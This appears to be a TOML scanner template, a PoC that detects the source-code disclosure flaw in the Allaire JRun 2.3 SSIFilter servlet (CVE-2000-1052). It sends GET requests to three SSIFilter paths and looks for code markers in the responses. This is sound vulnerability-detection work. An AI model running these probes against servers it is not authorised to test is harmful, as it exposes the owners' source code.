[info]
author = "ave"
description = "通过直接调用 Allaire JRun 2.3 的 SSIFilter Servlet，远程攻击者可获取服务器上可执行文件（如 JSP、CFM）的源代码。发送特制 HTTP 请求到 SSIFilter 并检查响应中是否包含源代码内容。"
id = "POC-AVE-2000-1063"
name = "Allaire JRun 2.3 SSIFilter Servlet 源代码泄露 PoC"
severity = "medium"
tags = ["ave-2000-1063"]
vuln_id = [
    "CVE-2000-1052",
    "AVE-2000-1063",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/SSIFilter"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<?",
    "class ",
    "import ",
    "java.",
    "javax.",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ssi/SSIFilter"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<?",
    "class ",
    "import ",
    "java.",
    "javax.",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/SSIFilter"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<?",
    "class ",
    "import ",
    "java.",
    "javax.",
]
